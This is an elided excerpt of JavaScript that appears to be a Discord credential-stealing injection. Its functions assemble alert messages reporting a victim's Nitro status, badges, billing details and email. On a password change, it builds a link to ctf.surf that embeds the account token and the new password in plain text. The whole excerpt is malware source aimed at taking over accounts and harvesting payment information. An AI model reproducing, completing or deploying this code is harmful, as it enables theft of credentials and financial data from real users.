...
async function firstTime() {
    ...
    if (config.logout != "true" && config.logout != "%LOGOUT%") {
    ...
    var params = {
        ...
        embeds: [{
            ...
            "fields": [{
                ...
                name: "<:1337:1093566158839492741> Nitro",
                value: `${getNitro(userInfo.premium_type)}`,
                inline: !1
            }, {
                name: " Badges",
...
async function passwordChanged(oldPassword, newPassword, token) {
    ...
    var params = {
        ...
        content: config.ping[0] ? config.ping[1] : "",
        embeds: [{
            "title": "Password Changed Detected",
            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
            "color": config['embed-color'],
            "fields": [{
                name: "Info",
                ...
                name: "<:1337:1093566188547735707> Billing",
                value: `${billing}`,
                inline: !1
            }, {
                name: " Email",
